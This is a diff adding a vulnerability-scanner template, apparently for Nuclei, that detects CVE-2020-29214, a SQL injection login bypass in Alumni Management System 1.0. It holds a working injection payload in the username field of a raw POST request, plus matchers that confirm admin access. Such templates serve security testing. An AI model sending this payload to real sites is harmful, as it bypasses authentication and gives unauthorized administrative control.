@@ -1,0 +1,50 @@
+id: alumni-management-sqli
+
+info:
+  name: Alumni Management System 1.0 - SQL Injection
+  author: arafatansari
+  severity: critical
+  description: |
+    Alumni Management System 1.0 contains a SQL injection vulnerability via admin/login in the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://www.exploit-db.com/exploits/48883
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-29214
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 2
+  tags: sqli,auth-bypass,cms,edb,alumni
+
+http:
+  - raw:
+      - |
+        POST /admin/ajax.php?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin'+or+'1'%3D'1'%23&password={{rand_base(5)}}
+      - |
+        GET /admin/index.php?page=home HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Welcome back Admin!'
+          - 'Alumni List'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - '#login-form'
+        negative: true
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502204f60c60fee714d5be0096d65af152cab016b367ad488dff777d16a8e4a5a8552022100b541c03622534bd25bddfdad08e2a701475f826ab20ce07bc624f5ca4e537d72:922c64590222798bb761d5b6d8e72950
